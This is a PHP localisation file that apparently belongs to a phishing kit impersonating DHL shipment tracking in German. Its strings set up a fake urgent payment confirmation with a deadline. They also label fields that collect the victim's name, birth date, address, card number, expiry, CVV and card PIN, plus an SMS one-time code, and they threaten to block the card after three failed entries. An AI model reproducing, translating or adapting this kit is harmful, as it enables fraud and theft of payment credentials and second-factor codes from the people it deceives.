<?php

function lang($phrase){
	static $lang = array(

		'Title_page' => '| Willkommen | ',
		'Min_i1' => 'Alerts (1)',
		'Min_i2' => 'Global',
		'Min_i3' => 'Suche',


		'Ming_i1' => 'Track',
		'Ming_i2' => 'Schiff',
		'Ming_i3' => 'Logistiklösungen',
		'Ming_i4' => 'Kundenservice',




		'Text_i1' => 'DHL-SENDUNGSVERFOLGUNG',
		'Text_i2' => 'Hier finden Sie Informationen zu Ihren Sendungen.',
		'Text_i3' => 'Verfolgen Sie Ihre Paketsendungen jederzeit von der Sendung bis zur Lieferung',

		'Text_b1' => 'Wichtige Nachricht!',
		'Text_b2' => 'Um die Lieferung so schnell wie möglich abzuschließen, bestätigen Sie bitte die Zahlung',
		'Text_b3' => 'durch Klicken auf Weiter. Die Online-Bestätigung muss innerhalb der nächsten 14 Tage vor Ablauf erfolgen. ',

		'Input_i1' => 'Vollständiger Name',
		'Input_i2' => 'Geburtsdatum',
		'Input_i3' => 'Telefonnummer',
		'Input_i4' => 'Rechnungsadresse',
		'Input_i5' => 'Postleitzahl',


			'Input_cc1' => 'Name auf Karte',
			'Input_cc2' => 'Kartennummer',
			'Input_cc3' => 'Ablaufdatum MM / JJ',
			'Input_cc4' => 'Sicherheitscode CVV (CVC)',
            'Input_cc5' => 'Kartenstift',

		'Btn_n1' => 'Weiter',

		'Footer_title1' => 'POST DHL GROUP',
		'Footer_title2' => 'FOLLOW US',
		'Footer_text1' => 'Betrugsbewusstsein',
		'Footer_text2' => 'Rechtliche Hinweise',
		'Footer_text3' => 'Nutzungsbedingungen',
		'Footer_text4' => 'Datenschutzerklärung',
		'Footer_text5' => 'Streitbeilegung',
		'Footer_text6' => 'Barrierefreiheit',
		'Footer_text7' => 'Cookie-Einstellungen',
		'Footer_text8' => 'Info',
		'Footer_rights' => '2020 © DHL International GmbH. Alle Rechte vorbehalten.',

        'text_succ' => 'Sie haben Ihren Versandprozess erfolgreich aktiviert. Sie erhalten eine E-Mail von uns, wenn wir Ihr Paket senden.',

		'Sms_text1' => 'Bitte bestätigen Sie die folgende Zahlung.',
		'Sms_text2' => 'Das eindeutige Passwort wurde an die unten aufgeführte Handynummer gesendet. Wenn Sie Ihre Handynummer ändern müssen, wenden Sie sich bitte an Ihre Bank oder ändern Sie sie über die verfügbaren Kanäle (Geldautomat, Internet).',
		'Sms_text3' => 'Händler:',
		'Sms_text4' => 'Betrag:',
		'Sms_text5' => 'Datum:',
		'Sms_text6' => 'SMS-Code:',
		'Sms_text7' => 'Bitte geben Sie den von sms empfangenen Bestätigungscode ein:',
		'Sms_error1' => 'SMS ist falsch oder abgelaufen! Nach (3) Fehlern bei der Eingabe des per SMS empfangenen Codes wird die aktuelle Transaktion abgebrochen und die Kreditkarte gesperrt.'
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
